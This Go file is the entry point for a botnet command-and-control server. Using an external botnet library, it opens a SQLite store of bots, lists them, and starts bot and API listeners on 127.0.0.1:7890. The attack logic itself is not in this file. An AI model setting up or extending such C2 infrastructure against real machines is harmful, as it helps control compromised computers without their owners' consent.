package main

import (
	"encoding/hex"
	"fmt"
	"log"

	"github.com/rodzzlessa24/botnet"
	"github.com/rodzzlessa24/botnet/sqlite"
)

func main() {
	db, err := sqlite.Open("./cc.db")
	if err != nil {
		log.Panic(err)
	}
	defer db.Close()
	storage := &sqlite.Client{DB: db}

	c := botnet.NewCC("127.0.0.1", "7890", storage)

	bots, err := c.Storage.ListBots()
	if err != nil {
		panic(err)
	}

	fmt.Println("len bots", len(bots))
	fmt.Println("bot id", hex.EncodeToString(bots[0].ID))
	go c.Listen()
	c.ListenAPI()
}
